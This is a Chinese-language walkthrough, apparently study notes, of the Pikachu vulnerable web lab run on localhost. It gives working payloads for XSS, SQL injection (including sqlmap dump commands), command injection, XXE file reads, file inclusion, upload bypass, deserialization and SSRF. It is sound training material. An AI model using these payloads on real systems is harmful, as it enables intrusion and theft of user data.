@@ -1,0 +1,331 @@
+一、暴力破解
+1.基于表单的暴力破解:
+    随便输入账号和密码，进行抓包
+    进入爆破模式，选择群集炸弹，对账号和密码进行爆破
+    改包，放包
+2.验证码绕过(on server)
+    随便输入，发现验证码会刷新
+    随便输入账号和密码，进行抓包
+    发现有刚刚输入的包和要对验证码进行修改的包
+    进入爆破模式，选择群集炸弹，对账号和密码进行爆破
+    改包，依次放包
+3.验证码绕过(on client)
+    随便输入，发现验证码会刷新
+    查看代码，发现有js代码，任何在前端进行的验证，都是完全没有任何作用的
+    在浏览器里面禁用js代码，刷新发现没有验证码了
+    随便输入账号和密码，进行抓包
+    改包，放包
+4.token防爆破?
+     "token"通常指的是一个用于验证用户身份和授权访问的令牌。它是一种特殊的字符串或代码，
+     由服务器生成并分配给经过身份验证的用户。用户在成功登录后，服务器会颁发一个token给客户端（例如Web浏览器），
+     客户端将在随后的请求中将该token作为身份验证凭据发送给服务器。
+    
+    1. **Sniper（狙击手）**：只 1 个变量，其余固定。逐个替换这个位置。
+    2. **Battering ram（撞锤）**：多个位置，共用同一个 payload 列表。所有位置同步替换。
+    3. **Pitchfork（草叉）**：多变量，各自独立 payload，**按顺序一一配对，取最短长度**。
+    4. **Cluster bomb（集群炸弹）**：笛卡尔积，全部组合。**token 题目禁止使用**。
+
+     看源码，发现有token，随便输入，抓包（用Pitchfork）
+     因为一一对应只能payload密码和token，账号猜admin
+     token用递归提取填入第一个token值，设置资源池为1，检索提取添加token
+     开始攻击，长度最小的就是密码
+
+二、Cross-Site Scripting(XSS)
+    <img src=x onerror=alert(1)>
+    最经典！src=x 图片不存在 → 触发onerror，直接弹框，不用任何操作
+    <svg onload=alert(1)>
+    svg 加载完成触发 onload，自动执行，很多时候能绕过对 img 标签的过滤
+    <iframe onload=alert(1)>
+    iframe 加载完毕触发 JS
+
+1.反射型xss(get)
+    输入<script>alert('xss')</script>,发现有字数限制，查看源码限制为20
+    但是在源码修改之后，可以进行写入
+2.反射性xss(post)
+    登录可以和前面一样爆破，登录后输入<script>alert('xss')</script>
+3.存储型xss
+    输入<script>alert('xss')</script>,每次刷新页面都会弹窗
+4.DOM型xss
+    查看源码发现调用了这个函数
+    var str = document.getElementById("text").value;
+    document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
+    可以尝试自己拼接str达到弹窗效果，如<img src="#" onmouseover="alert('xss')">
+    输入'><img src="#" onmouseover="alert('xss')">
+    页面渲染这个标签后，鼠标移上去，立刻弹出 xss 弹窗，#为无效地址
+5.DOM型xss-x
+    ar str = window.location.search;//截取url?后面的内容
+    var txss = decodeURIComponent(str.split("text=")[1]);
+    var xss = txss.replace(/\+/g,' ');//+号换成' '
+    document.getElementById("dom").innerHTML = "<a href='"+xss+"'>就让往事都随风,都随风吧</a>";
+    输入'><img src="#" onmouseover="alert('xss')">,再点击连接才可以弹窗
+6.xss盲打
+    输入<script>alert('xss')</script>等内容提交，去后台，发现后台只要刷新后台界面就会有弹窗
+7.xss之过滤
+    输入<script>alert('xss')</script>，发现被过滤了
+    换成<iframe onload=alert(1)>即可
+8.xss之htmlspecialchars
+    htmlspecialchars:PHP 内置函数，把特殊 HTML 字符转成 HTML 实体，让浏览器把代码当成纯文本显示，目的是防御 XSS。
+    & → &amp;
+    < → &lt;
+    > → &gt;
+    " → &quot; （双引号，是否转换要看第二个参数）
+    ' → &#039;（单引号，默认不转换！）
+    输入<" ' &>，发现只有'正常输出
+    输入1，查看源码有<a href='1'>1</a>
+    发现'没有被转换，输入' onclick='alert(1)
+9.xss之href输出
+    输入<" ' &>，查看源码发现都被转换了
+    输入javascript:alert(1)可以绕过
+10.xss之js输出
+    输入<script>alert(1)</script>,查看源码
+    <script>
+        $ms='<script>alert(1)</script>';
+        if($ms.length != 0){
+            if($ms == 'tmac'){
+                $('#fromjs').text('tmac确实厉害,看那小眼神..')
+            }else {
+    //            alert($ms);
+                $('#fromjs').text('无论如何不要放弃心中所爱..')
+            }
+        }
+    </script>
+    先进行前面的<script>的闭合在创造出一个<script>,可以这样拼接
+    输入'</script><script>alert(1)</script>
+三.CSRF
+1.CSRF(get)
+    点击提示可以拿到用户名和密码，也可暴力破解尝试，进入之后修改信息
+    抓包，右击相关工具的生成SCRF Poc可以修改内容，点击用浏览器测试，会生成url，访问url点击确认按钮
+    再次查看时发现用户信息更新为抓包修改后的内容
+    先用户修改之后，再点击黑客生成的链接可以再次修改
+2.CSRF(post)
+    与上面同理
+3.CSRF Token login
+    后台会对我们在url中提交的token和服务器中生成的token进行比较，这里我们就无法通过伪造url进行修改个人信息了
+    可以模仿暴力破解带token的题目一样去解决
+四.sql注入
+1.数字型注入
+    抓包,发现输入的数字不要'',与题目意思一样是纯数字，根据order by 或者select 1,1....
+    可以发现放回两列，先注入 1 union select database(),version()  可以看到数据库和其版本号
+    为pika 5.7.26，再次注入查看该数据库有什么表：
+    1 union select 1,table_name from information_schema.tables where table_schema='pika'
+    返回：httpifo member message users xssblind个表
+    依次查看表的列名：
+    1 union select 1,column_name from information_schema.columns where table_name='httpinfo'
+    返回：id userid ipaddress useragent httpaccept remoteport
+    后面表同理：
+    member:id username pw sex phonenum address email
+    message:id content time
+    users:id username password level
+    xssblind:id time content name
+    再看表里面的内容，最后发现内容在member表里：
+                <p class='notice'>hello,1 <br />your email is: vince</p>
+			   <p class='notice'>hello,2 <br />your email is: allen</p>
+			   <p class='notice'>hello,3 <br />your email is: kobe</p>
+			   <p class='notice'>hello,4 <br />your email is: grady</p>
+			   <p class='notice'>hello,5 <br />your email is: kevin</p>
+			   <p class='notice'>hello,6 <br />your email is: lucy</p>
+			   <p class='notice'>hello,7 <br />your email is: lili</p>
+2.字符型注入
+    抓包，在后面多写一个'发现会报错"1"',说明是字符串而且多个'报错
+    order by发现是两列，查看数据库和版本发现和上面是一样的
+    填入内容kobe发现可以找到，可以知道kobe your uid:3 your email is: 6内容
+    有email的好像就只有member表，注入查看一下：
+    kobe' union select 1,concat_ws('-',id,username,email) from member-- -
+    可以确定该信息确实在member表里面
+3.搜索型注入
+    尝试注入发现也是和题2一样的字符串，可以一样的方法
+4.xx型注入
+    尝试输入kobe，发现可以输出，输入1，发现不存在也可以输出
+    后面加个',报错''kobe'')',加''发现输入不存在，加'''报错''kobe'''')'
+    由此可知''  [kobe'] ')' , '' [kobe''] ')' , '' [kobe'''] ')'  []里面为填入的内容
+    可以猜测前面有个(,可以这样注入：
+    kobe')-- -就可以正常查询，下面就可以重复上面的步骤注入得到信息
+5.insert/updata注入
+    INSERT INTO users(username,password) VALUES('admin','123456');
+    UPDATE users SET password='666666' WHERE username='admin';
+    进入注册界面，输入信息进行抓包，修改username的信息加',发现报错，如
+    INSERT INTO users(username,password) VALUES('admin'','123456');
+    进行报错提取数据，注入
+    1' and EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database()))) and '
+    可以得到数据库
+    再查看表：
+    1' and EXTRACTVALUE(1, CONCAT(0x5c, (SELECT table_name from information_schema.tables where table_schema='pika'))) and '
+    发现只能返回一行，这时用group_concat()返回一行
+    1' and EXTRACTVALUE(1, CONCAT(0x5c, (SELECT group_concat(table_name) from information_schema.tables where table_schema='pika'))) and '
+    可以获得表名，后面数据同理
+6.delete注入
+    DELETE FROM users WHERE id=1;
+    和什么基本同理，抓包找到删除的id号，后面进行注入
+    and extractvalue(1,concat(0x5c,(select database())))
+    可以知道数据库名
+    and EXTRACTVALUE(1, CONCAT(0x5c, (SELECT group_concat(table_name) from information_schema.tables where table_schema='pika')))
+    可以知道表名，后面同理
+7.http头注入
+    先登录，发现会显示UA和accept的信息，可以抓包尝试看看能不能在这里面注入
+    在UA上尝试注入：
+    1' and extractvalue(1,concat(0x5c,(select database())))and '
+    发现可以返回数据库信息，后面同理
+8.基于boolian的盲注
+    sqlmap解决：
+    python sqlmap.py -u "http://127.0.0.1/pikachu/vul/sqli/sqli_search.php?name=1&submit=%E6%90%9C%E7%B4%A2"
+    获得数据库版本
+    python sqlmap.py -u "http://127.0.0.1/pikachu/vul/sqli/sqli_search.php?name=1&submit=%E6%90%9C%E7%B4%A2" --dbs
+    获得数据库名称
+    python sqlmap.py -u "http://127.0.0.1/pikachu/vul/sqli/sqli_search.php?name=1&submit=%E6%90%9C%E7%B4%A2" -D "pikachu" --tables
+    获得对应数据库里面的表
+    python sqlmap.py -u "http://127.0.0.1/pikachu/vul/sqli/sqli_search.php?name=1&submit=%E6%90%9C%E7%B4%A2" -D "pikachu" -T "users" --columns
+    获得表的列名
+    python sqlmap.py -u "http://127.0.0.1/pikachu/vul/sqli/sqli_search.php?name=1&submit=%E6%90%9C%E7%B4%A2" -D "pikachu" -T "users" -C "password,username" --dump
+    获得对应列名的数据
+9.基于时间的盲注
+    sqlmap
+10.wide byte注入
+    宽字节注入利用Unicode编码中的特性，将特殊字符转换为双字节字符，绕过输入过滤和检查，从而执行恶意的SQL查询
+    %df 是 URL 编码 → 对应字节 0xdf
+    %df' 也就是 0xdf'，这是宽字节注入的经典写法。
+    --+ → 解码后 = -- （-- 加一个空格）
+    name=1%df' union select version(),database() --+
+    name=1%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+    这里我一直报错，最后我去看了别人的payload才发现是查询内部语句有引号导致的，这里使用16进制编码绕过
+    name=1%df' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273--+
+    name=1%df' union select group_concat(username),group_concat(password) from pikachu.users --+
+
+五.RCE
+    Windows系统：
+    |：只执行后面的语句。
+    ||：如果前面的语句执行失败，则执行后面的语句。
+    &：两条语句都执行，如果前面的语句为假则执行后面的语句，如果前面的语句为真则不执行后面的语句。
+    &&：如果前面的语句为假，则直接出错，也不再执行后面的语句；前面的语句为真则两条命令都执行，前面的语句只能为真。
+
+    Linux系统：
+    ;：执行完前面的语句再执行后面的语句，当有一条命令执行失败时，不会影响其它语句的执行。
+    |（管道符）：只执行后面的语句。
+    ||（逻辑或）：只有前面的语句执行出错时，执行后面的语句。
+    &（后台任务符）：两条语句都执行，如果前面的语句为假则执行后面的语句，如果前面的语句为真则不执行后面的语句。
+    &&（逻辑与）：如果前面的语句为假则直接出错，也不再执行后面的语句；前面的语句为真则两条命令都执行，前面的语句只能为真。（命令替换）：当一个命令被解析时，它首先会执行反引号之间的操作。例 echo whoami
+1.exec "ping"
+    输入127.0.0.1|dir C:
+    可以读出C盘的内容
+2.exec "eval"
+    动态执行代码：eval() 函数使程序能够在运行时动态执行字符串中的代码。
+    它可以将字符串中的代码作为有效的程序代码进行解析和执行。
+
+    字符串转换为代码：eval() 函数将接收到的字符串参数解析为编程语言的有效代码，
+    并尝试执行该代码。这意味着您可以在字符串中包含变量、表达式、函数调用等，并且它们将在执行时被解释和计算。
+    输入phpinfo();
+六.File Include
+1.local
+    http://localhost:8089/pika/pika/vul/fileinclude/fi_local.php?filename=file2.php&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
+    其中filename=file2.php可以进行修改
+2.remote
+    http://localhost:8089/pika/pika/vul/fileinclude/fi_remote.php?filename=include%2Ffile1.php&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2#
+    filename=include%2Ffile1.php可以换成百度的网址
+七.unsafe filedownload
+    可以看到文件的下载路径，可以进行修改
+    http://localhost:8089/pika/pika/vul/unsafedownload/down_nba.php/execdownload.php?filename=ai.png
+八.unsafe upfileupload   
+1.客户端check
+    表名不可以上传其他类型文件，但是检验代码在前端的js里面，直接禁用js就可以上传了
+2.服务端check
+    先上传一个图片，抓包，发现：Content-Type: image/png
+    再上传一个php文件，抓包，发现不是Content-Type: image/png,改成这个就可以上传成功
+3.getimagesize()
+    上传图片马，在图片内容后面加php代码
+九.over permission
+1.水平越权
+    http://127.0.0.1:8089/pika/pika/vul/overpermission/op1/op1_mem.php?username=lili&submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
+    username可以换成其他用户进行越权
+2.垂直越权
+    admin用户里面的添加用户权限的url
+    http://127.0.0.1:8089/pika/pika/vul/overpermission/op2/op2_admin_edit.php
+    可以直接被普通用户访问
+十.目录遍历
+    http://127.0.0.1:8089/pika/pika/vul/dir/dir_list.php?title=truman.php
+    title可以进行文件的遍历
+十一.敏感信息泄露概述
+    http://127.0.0.1:8089/pika/pika/vul/infoleak/findabc.php是登录界面
+    http://127.0.0.1:8089/pika/pika/vul/infoleak/abc.php登录后的页面
+    即使不登录也可以访问登录后的界面
+十二.PHP反序列化
+    序列化serialize()
+    序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:      class S{
+            public $test="pikachu";
+        }
+        $s=new S(); //创建一个对象
+        serialize($s); //把这个对象进行序列化
+        序列化后得到的结果是这个样子的:O:1:"S":1:{s:4:"test";s:7:"pikachu";}
+            O:代表object
+            1:代表对象名字长度为一个字符
+            S:对象的名称
+            1:代表对象里面有一个变量
+            s:数据类型
+            4:变量名称的长度
+            test:变量名称
+            s:数据类型
+            7:变量值的长度
+            pikachu:变量值
+            
+    反序列化unserialize()
+    就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。    
+     $u=unserialize("O:1:"S":1:{s:4:"test";s:7:"pikachu";}");
+        echo $u->test; //得到的结果为pikachu
+
+    序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题         常见的几个魔法函数:
+            __construct()当一个对象创建时被调用
+
+            __destruct()当一个对象销毁时被调用
+
+            __toString()当一个对象被当作一个字符串使用
+
+            __sleep() 在对象在被序列化之前运行
+
+            __wakeup将在序列化之后立即被调用
+
+            漏洞举例:
+
+            class S{
+                var $test = "pikachu";
+                function __destruct(){
+                    echo $this->test;
+                }
+            }
+            $s = $_GET['test'];
+            @$unser = unserialize($a);
+
+            payload:O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
+1.PHP反序列化
+    输入O:1:"S":1:{s:4:"test";s:25:"<script>alert(1)</script>";}即可
+十三.XXE
+    既"xml外部实体注入漏洞"。
+    概括一下就是"攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题"
+    也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。
+1.xxe漏洞
+    提交：
+    <?xml version="1.0"?>
+    <!DOCTYPE ANY [
+        <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
+    <a>&xxe;</a>
+十四.URL重定向
+1.不安全的url跳转
+    主页链接是http://127.0.0.1:8089/pika/pika/vul/urlredirect/urlredirect.php
+    有链接http://127.0.0.1:8089/pika/pika/vul/urlredirect/urlredirect.php?url=i
+    url可以修改为恶意网站链接
+十五.SSRF
+    SSRF(Server-Side Request Forgery:服务器端请求伪造) 其形成的原因大都是由于服务端提供了从其他服务器应用
+    获取数据的功能,但又没有对目标地址做严格过滤与限制 导致攻击者可以传入任意的地址来让后端服务器对其发起请求,
+    并返回对该目标地址请求的数据
+    数据流:攻击者----->服务器---->目标地址
+    根据后台使用的函数的不同,对应的影响和利用方法又有不一样  PHP中下面函数的使用不当会导致SSRF:
+    file_get_contents()
+    fsockopen()
+    curl_exec()
+                
+    如果一定要通过后台服务器远程去对用户指定("或者预埋在前端的请求")的地址进行资源请求,则请做好目标地址的过滤。 
+1.SSRF(URL)
+    http://127.0.0.1:8089/pika/pika/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pika/vul/ssrf/ssrf_info/info1.php
+    url可以换成服务器里面的恶意网页
+2.SSRF(file_get_contents())
+    http://127.0.0.1:8089/pika/pika/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1:8089/pika/pika/vul/ssrf/ssrf_info/info2.php
+    可以使用php的伪协议
+    ?file=PHP://filter/read=convert.base64-encode/resource=D:\DumpStack.log
+    然后进行解码
